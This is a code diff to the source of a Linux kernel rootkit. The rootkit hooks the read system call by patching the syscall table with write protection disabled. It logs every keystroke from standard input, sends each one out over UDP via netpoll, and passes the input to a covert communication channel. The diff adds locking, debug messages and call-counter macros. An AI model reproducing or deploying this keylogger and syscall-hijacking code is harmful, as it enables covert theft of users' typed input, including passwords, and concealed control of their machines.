@@ -18,6 +18,8 @@ asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t coun
  * read syste call while it is still in use
  */
 static int read_call_counter = 0;
+static spinlock_t read_lock;
+static unsigned long read_lock_flags;
 
 /* netpoll struct */
 static struct netpoll *np = NULL;
@@ -58,31 +60,30 @@ void send_udp(const char *buf)
  * Our manipulated read syscall. It will log keystrokes and serve as a covert
  * communication channel.
  */
-asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
+asmlinkage long
+manipulated_read (unsigned int fd, char __user *buf, size_t count)
 {
-	read_call_counter++;
-	/* nothing else above this line */
-	
-	long ret;
-	ret = original_read(fd, buf, count);
+	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
+		
+	long ret = original_read(fd, buf, count);
 
 	if(ret >= 1 && fd == 0)
 	{
 		// TODO: implement keylogging : done : Sending letter by letter
 		send_udp(buf);
 
-		// TODO: implement covert communication channel
+		/* send to covert communication channel */
 		accept_input(buf[0]);
 	}
 
-	/* nothing else below this line */
-	read_call_counter--;
+	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
 	return ret;
 }
 
 /* hooks the read system call */
 void hook_read(void)
 {
+	ROOTKIT_DEBUG("Hooking read syscall...\n");
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* Init the netpoll structure */
@@ -102,12 +103,15 @@ void hook_read(void)
 /* unhooks read and returns the kernel to its regular state */
 void unhook_read(void)
 {
+	ROOTKIT_DEBUG("Restoring original read...\n");
+	
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* ensure that all processes have left our manipulated syscall */
 	while(read_call_counter > 0) {
-		msleep(2);
+		//msleep(2);
 	}
+	spin_lock_irqsave(&read_lock, read_lock_flags);
 	
 	/* disable write protection */
 	disable_page_protection();
@@ -115,6 +119,10 @@ void unhook_read(void)
 	/* restore the old syscall */
 	sys_call_table[__NR_read] = (unsigned long *) original_read;
 
+	spin_unlock_irqrestore(&read_lock, read_lock_flags);
+
 	/* reenable write protection */
 	enable_page_protection();
+	
+	ROOTKIT_DEBUG("Done.\n");
 }
